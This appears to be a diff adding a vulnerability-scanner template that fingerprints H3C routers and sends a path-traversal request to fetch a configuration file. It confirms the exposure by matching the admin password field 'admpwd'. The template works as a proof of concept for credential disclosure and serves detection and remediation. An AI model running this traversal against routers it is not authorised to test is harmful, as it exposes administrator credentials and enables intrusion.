@@ -1,0 +1,47 @@
+id: h3c-router-infoleak
+
+info:
+  name: H3C Router Information Leak
+  author: adeljck
+  severity: high
+  description: |
+    This template detects information leakage in H3C routers by extracting module names from the title tag and checking for configuration file exposure.
+    finger:
+      hunter: web.body="icg_helpScript.js"
+      fofa: body="icg_helpScript.js"
+      quake: body:"icg_helpScript.js"
+  remediation: |
+    Ensure that the router's web interface is not exposed to the internet or untrusted networks. Implement access control measures and update the router firmware to the latest version to address any known vulnerabilities.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: module_name
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "<title>([A-Za-z0-9-]+)系统管理</title>"
+
+  - raw:
+      - |
+        GET /userLogin.asp/../actionpolicy_status/../{{module_name}}.cfg HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admpwd"
+        part: body
